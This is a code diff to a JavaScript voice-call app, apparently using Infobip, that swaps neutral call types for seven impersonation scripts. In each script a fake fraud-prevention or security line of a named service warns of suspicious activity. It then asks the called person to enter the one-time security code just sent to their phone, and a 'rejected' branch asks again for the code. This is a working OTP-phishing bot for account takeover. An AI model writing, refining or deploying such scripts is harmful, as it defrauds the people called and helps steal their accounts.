@@ -50,22 +50,89 @@ const VOICE_MODELS = [
   { id: "zeus", name: "Zeus (Male, Deep)" },
 ];
 
-// Call types
+// Call types with their default messages
 const CALL_TYPES = [
-  { id: "login_verification", name: "Login Verification" },
-  { id: "otp_delivery", name: "OTP Delivery" },
-  { id: "appointment_reminder", name: "Appointment Reminder" },
-  { id: "custom", name: "Custom Script" },
+  { 
+    id: "password_change_1", 
+    name: "Password Change 1",
+    steps: {
+      step1: "Hello {name}, This is the {service} account service prevention line. This automated call was made due to suspicious activity on your account. We have received a request to change your password. If it was not you press 1, if it was you press 0.",
+      step2: "Thank you for your confirmation, to block this request. Please enter the {digits}-digit security code that we sent to your phone number.",
+      step3: "Thank you. Please hold for a moment while we verify your code.",
+      accepted: "Thank you for waiting. We will get back to you if we need further information thank you for your attention. Goodbye.",
+      rejected: "Thank you for waiting, to verification code you entered previously is incorrect. Please make sure you enter the correct code. Please enter {digits}-digit security code that we sent to your phone number.",
+    }
+  },
+  { 
+    id: "password_change_2", 
+    name: "Password Change 2",
+    steps: {
+      step1: "Hello {name}, this is an automated security alert from {service}. We have received a request to change your account password. If this was not you, press 1 to block the request immediately, or press 0 if you authorized this change.",
+      step2: "Thank you for the report. To immediately block this unauthorized request, please enter the {digits}-digit security code we just sent to your mobile device.",
+      step3: "Thank you. Please stay on the line while we validate the security code you entered.",
+      accepted: "Thank you for waiting. The unauthorized request has been blocked and your account is now secure. We will contact you if further info is needed. Goodbye.",
+      rejected: "We're sorry, the code you entered is incorrect. Please re-enter the {digits}-digit security code that was sent to your device.",
+    }
+  },
+  { 
+    id: "login_attempt_1", 
+    name: "Login Attempt 1",
+    steps: {
+      step1: "Hello {name}, This is the {service} account service prevention line. This automated call was made due to suspicious activity on your account. Someone has attempted to log into your account. If it was not you press 1, if it was you press 0.",
+      step2: "Thank you for your confirmation, to block this request. Please enter the {digits}-digit security code that we sent to your phone number.",
+      step3: "Thank you. Please hold for a moment while we verify your code.",
+      accepted: "Thank you for waiting. We will get back to you if we need further information thank you for your attention. Goodbye.",
+      rejected: "Thank you for waiting, to verification code you entered previously is incorrect. Please make sure you enter the correct code. Please enter {digits}-digit security code that we sent to your phone number.",
+    }
+  },
+  { 
+    id: "login_attempt_2", 
+    name: "Login Attempt 2",
+    steps: {
+      step1: "Hello {name}, this is a security notification from {service} support. We have detected an unusual login attempt on your account from an unrecognized device. Press 1 to secure your account and cancel this login, or press 0 to confirm.",
+      step2: "Confirmation received. For your protection, please type in the {digits}-digit verification number you received via SMS now.",
+      step3: "Data received. Please wait a moment while our system verifies your identity.",
+      accepted: "Verification successful. The security measures are complete and your account is protected. Thank you for your attention, goodbye.",
+      rejected: "Verification failed due to an invalid entry. Please ensure you enter the correct numbers. Type in your {digits}-digit code now.",
+    }
+  },
+  { 
+    id: "new_login_request", 
+    name: "New Login Request",
+    steps: {
+      step1: "Hello {name}, this is a verification call from {service} regarding a new login request. To protect your account and deny this access, press 1. If you are currently trying to log in, please press 0.",
+      step2: "The block request is being processed. Please enter the {digits}-digit secret code sent to your phone to verify your identity.",
+      step3: "Thank you for your cooperation. Please hold briefly while the account securing process is finalized.",
+      accepted: "Thank you for your assistance. Your security issue has been resolved. Our team will provide updates via email if necessary. Goodbye.",
+      rejected: "The security code provided is not valid. Please check your messages and enter the correct {digits} digits to proceed with protection.",
+    }
+  },
+  { 
+    id: "suspicious_activity", 
+    name: "Suspicious Activity",
+    steps: {
+      step1: "Hello {name}, your {service} account is currently under review due to suspicious activity. To prevent unauthorized access and lock your profile, press 1. If you believe this is a mistake, press 0 to proceed.",
+      step2: "Your access has been verified. Now, enter the {digits}-digit security number sent to your device to finalize the cancellation process.",
+      step3: "Please do not hang up. We are checking your security code; this will only take a moment.",
+      accepted: "Confirmation finished. We have successfully canceled all suspicious activity on your account. Thank you and have a secure day.",
+      rejected: "There seems to be an input error. To try again, please enter the {digits}-digit verification code found on your mobile phone.",
+    }
+  },
+  { 
+    id: "profile_update", 
+    name: "Profile Update Verification",
+    steps: {
+      step1: "Hello {name}, the {service} fraud prevention department is calling regarding a recent update to your security settings. Press 1 now if you did not initiate this update, or press 0 if this was an intentional action.",
+      step2: "To complete the account protection, please input the {digits}-digit code sent to your registered phone number now.",
+      step3: "Processing your verification. Please wait for further instructions while we confirm your status.",
+      accepted: "Your account has returned to normal status. Thank you for completing this verification in time. This call will now end.",
+      rejected: "Input not recognized. Please re-enter the {digits}-digit security code we sent to you to successfully block this request.",
+    }
+  },
 ];
 
-// Default step messages
-const DEFAULT_STEPS = {
-  step1: "Hello {name}, This is the {service} account service prevention line. This automated call was made due to suspicious activity on your account. We have received a request to change your password. If it was not you press 1, if it was you press 0.",
-  step2: "Thank you for your confirmation, to block this request. Please enter the {digits}-digit security code that we sent to your phone number.",
-  step3: "Thank you. Please hold for a moment while we verify your code.",
-  accepted: "Thank you for waiting. We will get back to you if we need further information thank you for your attention. Goodbye.",
-  rejected: "Thank you for waiting, the verification code you entered previously is incorrect. Please make sure you enter the correct code. Please enter {digits}-digit security code that we sent to your phone number.",
-};
+// Default step messages (Password Change 1 as default)
+const DEFAULT_STEPS = CALL_TYPES[0].steps;
 
 function App() {
   // Infobip config state
